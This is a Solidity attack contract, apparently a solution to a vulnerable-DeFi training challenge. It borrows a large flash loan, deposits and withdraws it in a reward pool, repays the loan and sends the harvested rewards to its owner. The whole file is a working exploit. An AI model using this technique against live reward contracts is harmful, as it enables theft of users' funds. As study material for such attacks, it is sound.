// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarder {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

contract RewarderAttacker {
    IERC20 DVT;
    IERC20 RewarderToken;
    IPool Pool;
    IRewarder Rewarder;
    address owner;

    constructor(
        address _DVT,
        address _pool,
        address _rewarder,
        address _rewarderToken
    ) {
        DVT = IERC20(_DVT);
        RewarderToken = IERC20(_rewarderToken);
        Pool = IPool(_pool);
        Rewarder = IRewarder(_rewarder);

        owner = msg.sender;

        DVT.approve(_rewarder, type(uint256).max);
    }

    function init() external {
        Pool.flashLoan(1_000_000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        Rewarder.deposit(amount);
        Rewarder.withdraw(amount);
        DVT.transfer(address(Pool), amount);
        RewarderToken.transfer(
            owner,
            RewarderToken.balanceOf(address(this))
        );
    }
}
